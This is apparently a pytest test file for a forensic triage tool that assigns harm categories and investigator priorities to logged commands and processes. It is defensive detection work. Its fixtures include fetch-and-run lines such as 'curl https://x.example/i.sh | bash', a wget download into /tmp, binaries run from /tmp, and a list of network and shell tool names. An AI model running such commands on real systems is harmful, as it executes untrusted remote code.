"""Investigator priority: what to look at first, and why.

Priority is separate from classification. An ordinary system daemon can be
honestly uncertain and still not be worth an investigator's morning; a command
with a real concern signal is worth one even when execution was never confirmed.
"""
import pytest

from analysis.activity import build_activity
from analysis.execution_model import COMMAND_HISTORY, EXECUTION_EVIDENCE, SESSION_EVENT
from analysis.triage import (
    NEEDS_REVIEW, NOT_HARMFUL, POTENTIALLY_HARMFUL, PRIORITY_1, PRIORITY_2, PRIORITY_3,
    classify_event, in_system_location, is_interpreter, transient_location,
)


def record(command=None, *, executable=None, kind=EXECUTION_EVIDENCE, confirmed=True,
           name=None, unit=None, reference="EXEC-0001", status=None,
           timestamp="2026-09-10T12:00:00+00:00"):
    return {
        "full_command_line": command, "executable": executable, "process_name": name,
        "evidence_kind": kind, "execution_confirmed": confirmed, "timestamp": timestamp,
        "source": "bash history" if kind == COMMAND_HISTORY else "systemd journal",
        "event_id": reference, "reference": reference, "systemd_unit": unit,
        "command_reconstruction_status": status or ("EXACT" if command else "EXECUTABLE_ONLY"),
        "command_evidence_strength": "STRONG" if command else "WEAK",
        "normalized_command": command, "unavailable": {},
    }


SYSTEM_PROCESSES = [
    "/usr/lib/systemd/systemd", "/usr/sbin/cron", "/usr/sbin/anacron",
    "/usr/sbin/NetworkManager", "/usr/sbin/ModemManager", "/usr/sbin/avahi-daemon",
    "/usr/bin/pipewire", "/usr/bin/gnome-shell", "/usr/bin/gnome-keyring-daemon",
    "/usr/libexec/gdm-session-worker", "/usr/lib/systemd/systemd-resolved",
    "/usr/libexec/packagekitd", "/usr/libexec/rtkit-daemon",
]


@pytest.mark.parametrize("image", SYSTEM_PROCESSES)
def test_ordinary_system_processes_are_informational(image):
    result = classify_event(record(None, executable=image, name=image.rsplit("/", 1)[-1]))

    assert result.priority == PRIORITY_3, f"{image} must not compete with a real lead"
    assert result.category == NOT_HARMFUL


def test_missing_arguments_are_a_limitation_not_a_suspicion():
    result = classify_event(record(None, executable="/usr/sbin/cron", name="cron",
                                   unit="cron.service"))

    assert result.priority == PRIORITY_3
    assert any("arguments were not captured" in note for note in result.limitations)
    # The gap is recorded as a limitation and contributes nothing to the score.
    assert all(signal.weight <= 0 for signal in result.signals)
    assert result.category != POTENTIALLY_HARMFUL
    assert not any(signal.name.startswith("remote_") or signal.name.startswith("execution_from_")
                   for signal in result.signals)


def test_the_missing_command_line_stays_visible():
    result = classify_event(record(None, executable="/usr/bin/nautilus", name="nautilus"))

    assert result.limitations, "the investigator must not lose the limitation"
    assert any("The command line" in unknown for unknown in result.unknowns)


def test_unknown_is_not_suspicious():
    """An unrecognised command is uncertain, which is not the same as concerning."""
    result = classify_event(record("holehe example@gmail.com --only-used", kind=COMMAND_HISTORY,
                                   confirmed=False))

    assert result.category == NEEDS_REVIEW
    assert result.priority == PRIORITY_3
    assert result.category != POTENTIALLY_HARMFUL


def test_a_concern_signal_outranks_a_missing_argument():
    """Structure in the command matters even when execution is unconfirmed."""
    result = classify_event(record("curl https://unknown.example/file | bash",
                                   kind=COMMAND_HISTORY, confirmed=False))

    assert result.category == POTENTIALLY_HARMFUL
    assert result.priority == PRIORITY_2
    assert "does not establish that it ran" in result.reason


@pytest.mark.parametrize("name", ["curl", "wget", "python3", "sudo", "ssh", "nc", "bash", "sh"])
def test_a_tool_name_alone_never_reaches_a_lead_tier(name):
    result = classify_event(record(None, executable=f"/usr/bin/{name}", name=name))

    assert result.priority == PRIORITY_3
    assert result.category != POTENTIALLY_HARMFUL


def test_an_interpreter_is_not_automatically_routine():
    """Context dominates the name: what python3 ran is the question."""
    result = classify_event(record(None, executable="/usr/bin/python3", name="python3"))

    assert result.category == NEEDS_REVIEW, "an interpreter's arguments are the point"
    assert result.priority == PRIORITY_3, "but unknown arguments are not a lead"
    assert any("interpreter" in unknown for unknown in result.unknowns)


def test_execution_from_a_writable_path_is_a_lead():
    result = classify_event(record(None, executable="/tmp/staged", name="staged"))

    assert result.category == POTENTIALLY_HARMFUL
    assert result.priority == PRIORITY_1
    assert result.recommended_action


def test_corroboration_raises_priority():
    weak = classify_event(record("curl https://x.example/i.sh | bash", kind=COMMAND_HISTORY,
                                 confirmed=False))
    corroborated = classify_event(
        record("curl https://x.example/i.sh | bash", kind=EXECUTION_EVIDENCE, confirmed=True),
        source_count=2)

    assert weak.priority == PRIORITY_2
    assert corroborated.priority == PRIORITY_1
    assert corroborated.score > weak.score
    assert any(signal.name == "corroborated_across_sources" for signal in corroborated.signals)


def test_an_artifact_match_raises_priority():
    artifact = {"path": "/tmp/staged", "collection_status": "COLLECTED", "hash": "a" * 64,
                "reference": "ART-0001"}
    without = classify_event(record(None, executable="/tmp/staged"))
    with_artifact = classify_event(record(None, executable="/tmp/staged"),
                                   correlated_artifact=artifact)

    assert with_artifact.score > without.score
    assert any(signal.name == "artifact_correlated" for signal in with_artifact.signals)


def test_weak_single_source_evidence_is_not_priority_one():
    result = classify_event(record("wget https://example.com/a.zip -O /tmp/a.zip",
                                   kind=COMMAND_HISTORY, confirmed=False))

    assert result.priority != PRIORITY_1
    assert result.category == POTENTIALLY_HARMFUL


def test_installer_shaped_commands_are_reviewed_not_escalated():
    installer = classify_event(record("curl -fsSL https://ollama.com/install.sh | sh",
                                      kind=COMMAND_HISTORY, confirmed=False))
    unknown_host = classify_event(record("curl https://unknown.example/x | bash",
                                         kind=COMMAND_HISTORY, confirmed=False))

    assert installer.priority == PRIORITY_2, "reviewed, not investigate-first"
    assert installer.category == POTENTIALLY_HARMFUL, "and never silently marked safe"
    assert any(signal.name == "installer_shaped_source" for signal in installer.signals)
    assert installer.score < unknown_host.score


def test_installer_context_is_stated_not_hidden():
    result = classify_event(record("curl -fsSL https://zed.dev/install.sh | sh",
                                   kind=COMMAND_HISTORY, confirmed=False))

    assert any("vendor install script" in signal.detail for signal in result.signals)
    assert any("piped directly into an interpreter" in signal.detail for signal in result.signals)


def test_an_installer_with_corroborating_execution_climbs_back():
    result = classify_event(record("curl -fsSL https://vendor.example/install.sh | sh",
                                   kind=EXECUTION_EVIDENCE, confirmed=True), source_count=2)

    assert result.priority == PRIORITY_1, "corroboration lifts it straight back up"


def test_priority_is_explained_by_named_signals():
    result = classify_event(record(None, executable="/tmp/staged"))

    assert result.signals
    for signal in result.signals:
        assert signal.name and signal.detail and isinstance(signal.weight, int)
    # The explanation is the signals, not a bare number.
    assert result.to_dict()["why"] == [signal.detail for signal in result.signals]


def test_scoring_is_deterministic():
    event = record("curl https://x.example/i.sh | bash", kind=COMMAND_HISTORY, confirmed=False)

    assert classify_event(event).score == classify_event(event).score
    assert classify_event(event).priority == classify_event(event).priority


def test_session_records_stay_informational():
    result = classify_event(record(None, kind=SESSION_EVENT, confirmed=False, name="session_open"))

    assert result.priority == PRIORITY_3
    assert result.category == NOT_HARMFUL


@pytest.mark.parametrize("path,expected", [
    ("/usr/bin/ls", True), ("/usr/sbin/cron", True), ("/usr/libexec/x", True),
    ("/usr/local/bin/thing", False), ("/opt/vendor/app", False), ("/tmp/x", False),
    ("C:\\Windows\\System32\\cmd.exe", True), ("C:\\Users\\a\\x.exe", False),
])
def test_system_location_excludes_locally_installed_software(path, expected):
    assert in_system_location(path) is expected


@pytest.mark.parametrize("path,expected", [
    ("/tmp/x", "tmp"), ("/var/tmp/x", "var/tmp"), ("/usr/bin/ls", None),
    ("C:\\Users\\a\\AppData\\Local\\Temp\\x.exe", "appdata/local/temp"),
])
def test_transient_locations(path, expected):
    assert transient_location(path) == expected


@pytest.mark.parametrize("path", ["/usr/bin/python3.12", "/usr/bin/perl", "/bin/bash",
                                  "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"])
def test_interpreters_are_recognised(path):
    assert is_interpreter(path, None)


def test_grouping_reports_priority_counts_and_leads():
    events = [
        record(None, executable="/usr/sbin/cron", name="cron", reference="EXEC-0001"),
        record(None, executable="/tmp/staged", name="staged", reference="EXEC-0002"),
        record("curl https://x.example/i.sh | bash", kind=COMMAND_HISTORY, confirmed=False,
               reference="CMD-0001"),
        record("apt update", kind=COMMAND_HISTORY, confirmed=False, reference="CMD-0002"),
    ]

    activity = build_activity(events)

    assert activity["triage"]["priorities"][PRIORITY_1] == 1
    assert activity["triage"]["priorities"][PRIORITY_2] == 1
    assert activity["triage"]["priorities"][PRIORITY_3] == 2
    # Leads are the top tiers, ordered, identified, and deduplicated by pattern.
    assert [lead["lead_id"] for lead in activity["leads"]] == ["LEAD-001", "LEAD-002"]
    assert activity["leads"][0]["priority"] == PRIORITY_1
    assert "/tmp/staged" in activity["leads"][0]["commands"]
    assert activity["by_priority"][PRIORITY_1]


def test_routine_activity_is_summarised_not_listed():
    events = [record("apt update", kind=COMMAND_HISTORY, confirmed=False,
                     reference=f"CMD-{index:04d}") for index in range(40)]

    activity = build_activity(events)

    summary = activity["routine_summary"]
    assert summary["activities"] == 1 and summary["records"] == 40
    assert summary["examples"]
    assert "remains in the appendices" in summary["note"]


def test_uncertainty_is_grouped_by_reason():
    events = [
        record("holehe a@b.com", kind=COMMAND_HISTORY, confirmed=False, reference="CMD-0001"),
        record("unknowncmd --x", kind=COMMAND_HISTORY, confirmed=False, reference="CMD-0002"),
        record(None, executable="/opt/vendor/app", name="app", reference="EXEC-0001"),
    ]

    reasons = build_activity(events)["review_reasons"]

    keys = {reason["reason"]: reason for reason in reasons}
    assert keys["command_history_only"]["records"] == 2
    assert keys["arguments_unavailable"]["records"] == 1
    assert all(reason["description"] and reason["examples"] for reason in reasons)


def test_the_most_urgent_occurrence_wins_its_group():
    events = [
        record("curl https://x.example/i.sh | bash", kind=COMMAND_HISTORY, confirmed=False,
               reference="CMD-0001"),
        record("curl https://x.example/i.sh | bash", kind=COMMAND_HISTORY, confirmed=False,
               reference="CMD-0002"),
    ]

    activity = build_activity(events)

    assert activity["groups"][0]["occurrences"] == 2
    assert activity["groups"][0]["classification"]["investigator_priority"] == PRIORITY_2
    # Grouping never loses a record.
    assert len(activity["groups"][0]["records"]) == 2
